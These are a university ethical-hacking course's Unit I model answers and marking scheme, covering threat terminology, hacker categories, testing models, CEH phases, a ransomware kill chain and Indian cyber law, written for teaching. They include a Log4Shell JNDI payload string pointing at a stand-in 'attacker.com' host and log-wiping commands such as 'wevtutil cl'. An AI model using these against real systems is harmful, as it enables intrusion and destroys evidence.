# Ethical Hacking (EH) — Unit I Model Answers & Marking Scheme
**Course**: Ethical Hacking (MD***) | **VIT Pune**  
**Unit I**: Introduction to Ethical Hacking & Threat Landscape

---

## Answer 1.1 [4 Marks]
### Marking Scheme:
* **Definitions (Vulnerability, Threat, Exploit)**: 1.5 Marks (0.5 marks each)
* **Risk Formula & Explanation**: 1.5 Marks
* **Real-World Concrete Example**: 1 Mark

### Model Answer:
1. **Core Definitions**:
   * **Vulnerability**: A flaw, defect, or weakness in system design, implementation, code, or configuration that creates an exposure to attack (e.g., an unpatched buffer overflow in an Apache web server, or a missing input validation filter).
   * **Threat**: Any potential circumstance, event, or entity with the capability and potential to cause harm by exploiting a vulnerability (e.g., a cybercriminal group executing ransomware, or a malicious insider).
   * **Exploit**: A defined sequence of commands, malicious payload, script, or specialized software designed specifically to target and take advantage of an existing vulnerability, triggering unintended system behavior (e.g., EternalBlue exploiting CVE-2017-0143).

2. **Risk Relationship & Formula**:
   Risk is the quantified likelihood and impact resulting from a threat agent exploiting a vulnerability:
   $$\text{Risk} = \text{Threat} \times \text{Vulnerability} \times \text{Impact}$$
   * If a vulnerability exists but no threat actor has an exploit or access, Risk is minimal.
   * If a critical threat exists but the system has zero vulnerabilities (fully patched), Risk is effectively mitigated.
   * Realized Risk requires the simultaneous intersection of an active Threat, an unmitigated Vulnerability, and tangible business Impact.

3. **Illustrative Real-World Example**:
   * **Vulnerability**: An unauthenticated Remote Code Execution flaw in Log4j library (`Log4Shell` - CVE-2021-44228).
   * **Threat**: Ransomware syndicate scanning Internet-facing enterprise endpoints.
   * **Exploit**: A JNDI lookup string (`${jndi:ldap://attacker.com/exploit}`) submitted via HTTP User-Agent header.
   * **Risk / Impact**: Complete server compromise leading to enterprise database exfiltration and ransomware deployment.

---

## Answer 1.2 [4 Marks]
### Marking Scheme:
* **Comparative Matrix (White vs Black vs Grey)**: 2.5 Marks
* **Legal Analysis of Grey Hat actions**: 1.5 Marks

### Model Answer:
1. **Comparative Matrix**:

| Parameter | White Hat Hacker | Black Hat Hacker | Grey Hat Hacker |
| :--- | :--- | :--- | :--- |
| **Authorization** | Full, explicit written legal authorization (Scope & RoE). | Zero authorization; strictly illicit entry. | No prior authorization or request. |
| **Primary Motivation** | Protect infrastructure, remediate flaws, enhance security posture. | Financial profit, espionage, extortion, sabotage, malice. | Curiosity, peer recognition, bug bounties, technical challenge. |
| **Legality** | 100% Legal and compliance-backed. | 100% Criminal activity (felony under cyber law). | **Illegal**; accessing unauthorized systems is a crime. |
| **Disclosure Process** | Private reporting strictly to the client via a signed VAPT report. | Sells on dark web forums or exploits for malicious gain. | Discloses publicly or contacts owner demanding reward ("extortion-lite"). |

2. **Why Grey Hat Hacking Remains Illegal**:
   Under international and Indian cyber legislation (IT Act 2000, Section 43/66), the critical legal threshold is **consent and authorization**, *not* post-facto intent:
   * **Trespass to Chattels**: Gaining unauthorized access or probing a third-party server without explicit prior agreement constitutes illegal computer trespass.
   * **Lack of RoE**: Grey hat testing can crash mission-critical industrial or healthcare systems inadvertently without emergency rollback contacts.
   * **Unsolicited Extortion**: Demanding a bug bounty after unauthorized exploitation often meets the statutory legal definition of digital extortion.

---

## Answer 1.3 [8 Marks]
### Marking Scheme:
* **Part (a) VA vs PT Comparison**: 4 Marks (1 mark per parameter: Objective, Methodology, Tooling, Business Impact)
* **Part (b) Black vs White vs Grey Box**: 4 Marks (3 marks for matrix + 1 mark for enterprise use cases)

### Model Answer:
#### Part (a) Vulnerability Assessment (VA) vs Penetration Testing (PT)

| Parameter | Vulnerability Assessment (VA) | Penetration Testing (PT) |
| :--- | :--- | :--- |
| **Objective** | Discover, identify, catalog, and prioritize known vulnerabilities across all reachable enterprise assets. | Actively exploit discovered flaws to prove breach feasibility, assess depth, and measure business impact. |
| **Methodology** | Automated, non-destructive, breadth-oriented scanning across an entire IP subnet or asset inventory. | Goal-oriented, depth-first, heavily manual simulation mimicking an active cyber adversary. |
| **Tooling Used** | Automated network/vulnerability scanners (Nessus, Qualys, OpenVAS, Nexpose). | Exploitation frameworks (Metasploit, Burp Suite Pro, Cobalt Strike, custom Python exploits). |
| **Business Impact** | Delivers a high-level list of potential weaknesses with CVSS scores; may contain false positives. | Proves real-world risk by chaining vulnerabilities to demonstrate tangible data loss or administrative takeover. |

#### Part (b) Black Box, White Box, and Grey Box Testing Models

```
+-----------------------------------------------------------------------------------+
|                           PENETRATION TESTING MODELS                              |
+--------------------------+----------------------------+---------------------------+
| Black Box (Zero Knowledge)| Grey Box (Partial Knowledge)| White Box (Full Knowledge)|
| External Attacker View   | Authenticated User View    | Architecture & Code Audit |
+--------------------------+----------------------------+---------------------------+
```

1. **Black Box (Zero Knowledge)**:
   * *Tester Perspective*: The tester begins with zero internal information—only public domain names or IP ranges.
   * *Cost & Duration*: High duration and cost due to extensive reconnaissance and enumeration required.
   * *Thoroughness*: Superficial compared to source review; tests perimeter defenses.
   * *Ideal Use Case*: Evaluating external internet perimeter defenses against opportunist cybercrime gangs.

2. **Grey Box (Partial Knowledge)**:
   * *Tester Perspective*: The tester receives standard employee/customer credentials and high-level architectural overview.
   * *Cost & Duration*: Balanced cost and optimal efficiency; eliminates brute reconnaissance.
   * *Thoroughness*: High coverage of business logic flaws, privilege escalation, and lateral movement.
   * *Ideal Use Case*: Enterprise SaaS application assessment evaluating tenant-isolation and privilege escalation.

3. **White Box (Full Knowledge / Crystal Box)**:
   * *Tester Perspective*: Full disclosure of complete source code, API specifications, network architecture diagrams, and domain admin credentials.
   * *Cost & Duration*: Highly efficient; enables deep static code analysis (SAST) and manual code auditing.
   * *Thoroughness*: Maximum exhaustive coverage; uncovers obscure, buried logical vulnerabilities.
   * *Ideal Use Case*: Critical core banking transactional systems or medical device firmware prior to production rollout.

---

## Answer 1.4 [8 Marks]
### Marking Scheme:
* **Phase 1 (Reconnaissance)**: 1.5 Marks (Objective, Tools, Black vs White Hat)
* **Phase 2 (Scanning & Enumeration)**: 1.5 Marks
* **Phase 3 (Gaining Access)**: 2 Marks
* **Phase 4 (Maintaining Access)**: 1.5 Marks
* **Phase 5 (Clearing Tracks / Reporting)**: 1.5 Marks

### Model Answer:
The 5 phases of the Certified Ethical Hacker (CEH) methodology structure offensive security engagements:

```
[ Phase 1: Reconnaissance ]
             │
             ▼
[ Phase 2: Scanning & Enumeration ]
             │
             ▼
[ Phase 3: Gaining Access ]
             │
             ▼
[ Phase 4: Maintaining Access ]
             │
             ▼
[ Phase 5: Clearing Tracks / Reporting ]
```

#### Phase 1: Reconnaissance (Information Gathering)
* **Technical Objective**: Collect maximum intelligence about target organization without raising suspicion.
* **Techniques & Tools**: Passive OSINT (theHarvester, Maltego, Shodan, WHOIS, DNS reconnaissance, Google Dorking).
* **Ethical vs Malicious**: Both use identical OSINT methods, but ethical hackers strictly confine research to domains and IP blocks formally agreed upon in the signed Scope document.

#### Phase 2: Scanning & Enumeration
* **Technical Objective**: Discover active hosts, open ports, running OS/services, and known vulnerabilities.
* **Techniques & Tools**: Host discovery (Nmap `-sn`), TCP SYN port scanning (Nmap `-sS`), service versioning (`-sV`), vulnerability assessment (Nessus, Nikto).
* **Ethical vs Malicious**: Malicious hackers scan indiscriminately with aggressive timing. Ethical hackers throttle scan rates (e.g., `-T2` or `-T3`) and operate only during pre-approved testing maintenance windows to avoid crashing production servers.

#### Phase 3: Gaining Access (Exploitation)
* **Technical Objective**: Exploit identified vulnerabilities to breach the target perimeter and achieve system execution.
* **Techniques & Tools**: Buffer overflows, SQL injection, remote code execution (RCE), Metasploit Framework, Burp Suite.
* **Ethical vs Malicious**: Malicious hackers deploy destructive payloads (ransomware, data destruction). Ethical hackers execute benign Proof-of-Concept (PoC) payloads (e.g., spawning a non-root reverse shell or executing `id`/`whoami` commands) to demonstrate risk without causing operational disruption.

#### Phase 4: Maintaining Access (Persistence)
* **Technical Objective**: Establish durable, covert communication channels so access persists across reboots or credential rotations.
* **Techniques & Tools**: Creating backdoors, malicious scheduled tasks/cron jobs, deploying web shells, Cobalt Strike beacons.
* **Ethical vs Malicious**: Malicious hackers deploy stealthy kernel-level rootkits to hide indefinitely. Ethical hackers install only minimal, sandboxed testing implants, log every artifact created, and track changes for guaranteed removal.

#### Phase 5: Clearing Tracks / Reporting
* **Technical Objective**: Handle engagement aftermath and post-exploitation artifacts.
* **Techniques & Tools**: Malicious actors wipe system logs (`auditd`, Windows Event Logs via `wevtutil cl`, modifying `utmp`/`wtmp`).
* **Ethical vs Malicious Difference**:
  * **Black Hat**: Deletes event logs, destroys evidence, and leaves backdoor implants.
  * **Ethical Hacker**: **Never deletes logs**. System logs are retained so the client's Blue Team can validate detection capabilities. The ethical hacker completely cleans up tools, removes test user accounts, restores original configurations, and writes a comprehensive **VAPT Executive & Technical Report** outlining root causes, CVSS risk scores, and step-by-step remediation guidance.

---

## Answer 1.5 [10 Marks]
### Marking Scheme:
* **Part (a) Cyber Kill Chain Scenario & Defenses**: 6 Marks (0.85 marks per phase: adversary action + corresponding defensive control)
* **Part (b.1) Indian IT Act Sections**: 2.5 Marks (0.5 marks each: Sec 43, 66, 66C, 66D, 66F)
* **Part (b.2) 4 Mandatory Legal Prerequisites**: 1.5 Marks

### Model Answer:
#### Part (a) Lockheed Martin Cyber Kill Chain — Ransomware Attack Walkthrough & Enterprise Defenses

```
[1. Recon] ──> [2. Weaponize] ──> [3. Deliver] ──> [4. Exploit]
                                                         │
[7. Actions on Obj] <── [6. Command & Control] <── [5. Install]
```

1. **Reconnaissance**:
   * *Adversary Action*: Threat actor uses LinkedIn and corporate directory scraping to map out employees in the Finance/Accounts department.
   * *Enterprise Defense*: Threat intelligence monitoring, employee social engineering awareness training, reducing public employee organizational disclosures.

2. **Weaponization**:
   * *Adversary Action*: Attacker crafts a weaponized Microsoft Excel invoice spreadsheet embedding a malicious obfuscated Visual Basic (VBA) macro with a PowerShell payload.
   * *Enterprise Defense*: Threat intelligence sandbox detonating attachments; blocking unapproved Office macros via Group Policy (GPO) across the enterprise.

3. **Delivery**:
   * *Adversary Action*: Attacker sends a spear-phishing email disguised as an overdue audit notice (`Urgent_Audit_Invoice.xlsm`) to an accounts manager.
   * *Enterprise Defense*: Secure Email Gateway (SEG) inspecting SPF, DKIM, DMARC records, and attachment sandboxing scanning for suspicious VBA scripts.

4. **Exploitation**:
   * *Adversary Action*: The user opens the document and clicks "Enable Content". The macro executes and triggers an in-memory PowerShell exploit.
   * *Enterprise Defense*: Endpoint Detection and Response (EDR) detecting anomalous parent-child execution (`excel.exe` spawning `powershell.exe`) and terminating the process.

5. **Installation**:
   * *Adversary Action*: The PowerShell script downloads a compiled ransomware binary and creates a persistent Windows Registry Run key (`HKCU\Software\Microsoft\Windows\CurrentVersion\Run`).
   * *Enterprise Defense*: Host-based Application Whitelisting (AppLocker/WDAC) restricting unauthorized executables from running outside standard protected folders.

6. **Command and Control (C2)**:
   * *Adversary Action*: The ransomware binary establishes an outbound encrypted TLS tunnel on port 443 to an external attacker-controlled C2 server to fetch the unique public encryption key.
   * *Enterprise Defense*: Next-Generation Firewall (NGFW) with SSL/TLS decryption inspection, and DNS sinkholing blocking newly registered malicious domains.

7. **Actions on Objectives**:
   * *Adversary Action*: The malware discovers local network shares, encrypts corporate transactional databases using AES-256, and drops a ransom note demanding 5 Bitcoin.
   * *Enterprise Defense*: Immutable offline backups (3-2-1 backup strategy), network micro-segmentation limiting lateral SMB share access, and automated SIEM canary file monitoring.

---

#### Part (b.1) Key Provisions of Indian Information Technology (IT) Act 2000 (Amended 2008)

1. **Section 43 (Penalty and Compensation for Damage to Computer System)**:
   * *Scope*: Civil liability for unauthorized access, data copying/extraction, virus/malware introduction, disruption, or denial of access.
   * *Penalty*: Compensatory damages payable to the affected victim up to ₹1 Crore.

2. **Section 66 (Computer-Related Offences / Hacking)**:
   * *Scope*: If any act referred to in Section 43 is committed dishonestly or fraudulently with criminal intent.
   * *Penalty*: Imprisonment up to 3 years, or a fine up to ₹5 Lakhs, or both.

3. **Section 66C (Punishment for Identity Theft)**:
   * *Scope*: Dishonestly or fraudulently using the electronic signature, password, or unique identification feature of another person.
   * *Penalty*: Imprisonment up to 3 years and fine up to ₹1 Lakh.

4. **Section 66D (Punishment for Cheating by Personation using Computer Resource)**:
   * *Scope*: Cheating by pretending to be another entity/person over computer systems or communications (e.g., Phishing scams).
   * *Penalty*: Imprisonment up to 3 years and fine up to ₹1 Lakh.

5. **Section 66F (Punishment for Cyber Terrorism)**:
   * *Scope*: Acts intended to threaten the unity, integrity, sovereignty, or security of India, or deny access to authorized personnel to critical infrastructure causing death, injury, or severe disruption.
   * *Penalty*: **Life Imprisonment**.

---

#### Part (b.2) Mandatory Legal Prerequisites for Ethical Hackers

Before issuing a single packet or probe, an ethical hacking engagement requires four binding legal documents:
1. **Scope of Work (SOW)**: Explicit, written list of in-scope domains, subnets, IP ranges, APIs, and explicit exclusions (e.g., third-party payment gateways or mission-critical production databases).
2. **Rules of Engagement (RoE)**: Operational boundaries defining allowed testing time windows, notification procedures for critical discoveries, prohibited vectors (strict ban on DoS/DDoS), and point-of-contact phone numbers.
3. **Non-Disclosure Agreement (NDA)**: Legally enforceable contract ensuring that any proprietary business data, trade secrets, customer records, or 0-day vulnerabilities uncovered remain strictly confidential.
4. **Letter of Authorization ("Get-Out-of-Jail Card")**: Official signed document on corporate letterhead from a C-level executive (CISO/CIO/CEO) stating that the named security consultants are conducting authorized security testing, safeguarding them from prosecution under Section 66.
